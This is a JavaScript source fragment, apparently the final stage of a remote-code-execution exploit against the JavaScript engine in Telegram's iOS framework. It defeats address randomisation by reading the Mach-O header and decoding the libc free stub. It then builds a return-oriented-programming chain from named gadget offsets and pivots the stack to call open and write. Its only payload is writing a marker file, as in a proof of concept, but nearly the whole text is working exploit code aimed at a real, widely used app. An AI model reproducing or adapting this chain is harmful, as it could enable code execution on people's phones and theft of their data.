/* ===================== iOS ROP endgame: open/write =====================
 *
 * Requires: rt, D, ENT, TRIG, RD, rd64, setR, Rb, Wb, Ridx, codeok, hex,
 *           setres, js_free (rt->mf.js_free stub), CFG.
 *
 * Pivot: rt->mf.js_malloc_usable_size (rt+0x20) = MOV SP,X1;RET.
 * js_free_rt calls it with X1 = user data of the large block (TRIG).
 * The js_free_rt tail epilogue then loads X19/X20/X21/X22/X30/SP from
 * TRIG[0x10..0x3f] and jumps to rt->mf.js_free (rt+0x10) = call gadget.
 *
 * Chain gadgets (TelegramUIFramework 13.2 / 36535):
 *   call  0x3292c  blr x21 ; ldp x29,x30,[sp,#0xa0] ; ... ; ret
 *   load  0x172d96c ldp x1,x2,[x20,#0x10] ; ldp x3,x4,[x20,#0x20] ;
 *                   ldr x5,[x20,#0x30] ; ret
 *   x0    0x628a2c ldr x0,[x22,#0x28] ; blr x19 ; pop x29/x30 ; ret
 * ====================================================================== */
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var opaque0 = rd64(rt + 64n);

  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { setres('ROP_NO_BASE'); return; }

  /* decode js_def_free stub -> libc free (same dyld-cache slide) */
  var libcFree = 0n;
  if (rd32_(js_free) === 0xaa0103e0) {
    var br = rd32_(js_free + 4n);
    if (((br & 0xfc000000) >>> 0) === 0x14000000) {
      var im = br & 0x03ffffff;
      if (im & 0x02000000) im -= 0x04000000;
      var plt = js_free + 4n + BigInt(im) * 4n;
      var ad = rd32_(plt);
      if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
        var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
        var ai = (mh << 2) | ml;
        if (ai & 0x100000) ai -= 0x200000;
        var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
        var ld = rd32_(plt + 4n);
        if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
          var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
          if (codeok(g2)) libcFree = g2;
        }
      }
    }
  }
  if (libcFree === 0n) { setres('ROP_NO_FREE'); return; }

  var OPEN   = u64(libcFree + 0x296b394cn);
  var WRITE  = u64(libcFree + 0x296b3738n);
  var PEXIT  = u64(libcFree + 0x4a21a474n);
  var G_CALL   = base + 0x3292cn;
  var G_LOAD   = base + 0x172d96cn;
  var G_X0     = base + 0x628a2cn;
  /* JavaScriptCore+0x3a0ee8: mov sp,x0 ; ret  (x0 = block header, 16-aligned) */
  var PIVOT2   = u64(libcFree - 0x66cccfcn);

  /* Pick the victim whose arena block leaves the most room after D. */
  function room(v) {
    var Dc = v.D & 0x00ffffffffffffffn;
    try {
      var hdr = RD(Dc - 8n);
      var bidx = Number(hdr & 0xffffn);
      var bsi = Number((hdr >> 16n) & 0xffn);
      if (bsi !== 8 || bidx >= 64) return -1;
      var H = Dc - 16n - BigInt(bidx) * 80n;
      var hq = RD(H);
      var cls = Number(hq & 0xffn);
      var nb = Number((hq >> 32n) & 0xffffn);
      if (cls !== 8 || nb < 10 || nb > 63 || bidx >= nb) return -1;
      return (nb - bidx) * 80;
    } catch (e) { return -1; }
  }
  var best = null, bestRoom = -1;
  for (var vi = 0; vi < V.length; vi++) {
    var rr = room(V[vi]);
    if (rr > bestRoom) { bestRoom = rr; best = V[vi]; }
  }
  if (best === null || bestRoom < 0x280) {
    setres('ROP_ROOM ' + bestRoom);
    return;
  }
  ENT = best; D = best.D;
  Wb = (ENT.cls === 29 ? ENT.vb : ENT.va);
  Rb = (ENT.cls === 29 ? ENT.va : ENT.vb);
  Ridx = (ENT.k + 56) >> 3;

  /* ---- layout inside D (known absolute address) ---- */
  var PATH = '/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt';
  var MSG = 'RCE_OK\n';
  function a8(x) { return (x + 7) & ~7; }
  var oPath = 0;
  var oMsg = a8(oPath + PATH.length + 1);
  var oA0 = a8(oMsg + MSG.length + 1);
  var oB0 = oA0 + 0x40;
  var oA1 = oB0 + 0x40;
  var oB1 = oA1 + 0x40;
  var oEnd = oB1 + 0x40;
  if (oEnd > bestRoom) { setres('ROP_LAYOUT ' + oEnd + '/' + bestRoom); return; }

  function put64(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  function putBytes(arr, off, s) {
    for (var i = 0; i < s.length; i++) arr[off + i] = s.charCodeAt(i) & 0xff;
    arr[off + s.length] = 0;
  }

  /* ---- ROP stack in TRIG (SP base = header = U-8, so U+0x08 is SP+0x10) ---- */
  var U = TRIG;
  if (!U || U.length < 0x300) { setres('ROP_TRIG'); return; }
  for (var i = 0; i < 0x300; i++) U[i] = 0;
  /* js_free_rt tail with SP=header: x22=U+8, x21=U+10, x20=U+18,
     x19=U+20, x30=U+30; SP becomes U+0x38. */
  put64(U, 0x08, D);
  put64(U, 0x10, G_LOAD);
  put64(U, 0x18, D + BigInt(oA0));
  put64(U, 0x20, 0n);
  put64(U, 0x28, 0n);
  put64(U, 0x30, 0n);
  /* G_CALL #1 at SP=U+0x38: loader -> open args; epilogue -> X0(open) */
  put64(U, 0xB8, D + BigInt(oB0));
  put64(U, 0xD0, OPEN);
  put64(U, 0xE0, G_X0);
  /* X0 open at SP=U+0xE8: epilogue -> loader(write args) */
  put64(U, 0xF0, G_LOAD);
  put64(U, 0xF8, D + BigInt(oA1));
  put64(U, 0x110, G_CALL);
  /* G_CALL #2 at SP=U+0x118: loader(write args); epilogue -> call write */
  put64(U, 0x1A0, WRITE);
  put64(U, 0x1C0, G_CALL);
  /* G_CALL #3 at SP=U+0x1C8: write(fd,msg,len); epilogue -> X0(pthread_exit) */
  put64(U, 0x248, D + BigInt(oB1));
  put64(U, 0x260, PEXIT);
  put64(U, 0x270, G_X0);

  /* ---- data in D (done after all BigInt work) ---- */
  var pAbs = D + BigInt(oPath);
  var mAbs = D + BigInt(oMsg);
  var pBytes = [], mBytes = [];
  for (var ib = 0; ib < 8; ib++) {
    pBytes.push(Number((pAbs >> BigInt(8 * ib)) & 0xffn));
    mBytes.push(Number((mAbs >> BigInt(8 * ib)) & 0xffn));
  }
  var RT_FREE = rt + 16n, RT_USABLE = rt + 32n, RT_SIZE = rt + 48n, RT_OPAQUE = rt + 64n;
  setres('ROP_RDY room=' + bestRoom);

  /* Free every pad object first: the class-80 blocks next to D then hold no
     live JS objects when the path/structs below overwrite them. */
  for (var pj = 0; pj < padA.length; pj++) { padA[pj] = null; padB[pj] = null; }

  for (var z = 0; z < oEnd; z++) ENT.u8[z] = 0;
  for (var z2 = 0; z2 < PATH.length; z2++) ENT.u8[oPath + z2] = PATH.charCodeAt(z2) & 0xff;
  ENT.u8[oPath + PATH.length] = 0;
  for (var z3 = 0; z3 < MSG.length; z3++) ENT.u8[oMsg + z3] = MSG.charCodeAt(z3) & 0xff;
  ENT.u8[oMsg + MSG.length] = 0;
  /* struct A0: open(path, 0x601, 0644) */
  ENT.u8[oA0 + 0x10] = 0x01; ENT.u8[oA0 + 0x11] = 0x06; /* 0x601 */
  ENT.u8[oA0 + 0x18] = 0xa4; ENT.u8[oA0 + 0x19] = 0x01; /* 0644 */
  /* struct B0: x0 = D + path */
  for (var i2 = 0; i2 < 8; i2++) ENT.u8[oB0 + 0x28 + i2] = pBytes[i2];
  /* struct A1: write(fd, msg, len) */
  for (var i3 = 0; i3 < 8; i3++) ENT.u8[oA1 + 0x10 + i3] = mBytes[i3];
  ENT.u8[oA1 + 0x18] = MSG.length;
  /* struct B1: x0 = 0 */

  /* ---- arm the pivot and fire ---- */
  setR(RT_FREE); Rb[0] = G_CALL;
  setR(RT_SIZE); Rb[0] = 0xffffffffffffffffn;
  setR(RT_OPAQUE); Rb[0] = 0n;
  setR(RT_USABLE); Rb[0] = PIVOT2;
  try { TRIG = null; } catch (e) { setres('ROP_EXC'); return; }
  setres('ROP_AFTER');
